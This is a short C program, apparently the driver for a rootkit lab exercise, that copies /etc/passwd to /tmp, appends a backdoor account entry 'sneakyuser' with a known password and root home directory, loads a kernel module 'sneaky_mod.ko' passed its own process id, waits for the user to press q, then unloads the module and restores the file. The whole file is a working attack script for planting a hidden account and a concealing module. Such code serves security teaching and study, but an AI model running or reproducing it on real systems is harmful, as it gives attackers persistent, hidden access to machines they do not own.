#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void attack1_copy_password()
{
  system("cp /etc/passwd /tmp/passwd");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> "
         "/etc/passwd");
}

void attack2_load_sneaky()
{
  char insmod[50];
  sprintf(insmod, "insmod sneaky_mod.ko pid=%d", (int)getpid());
  system(insmod);
}

void restore()
{
  system("rmmod sneaky_mod.ko");
  system("cp /tmp/passwd /etc/passwd");
  system("rm /tmp/passwd");
}

int main()
{
  // print process id
  printf("sneaky_process pid = % d\n", getpid());
  attack1_copy_password();
  attack2_load_sneaky();
  char c;
  while ((c = getchar()) != 'q')
  {
  }
  restore();
  return EXIT_SUCCESS;
}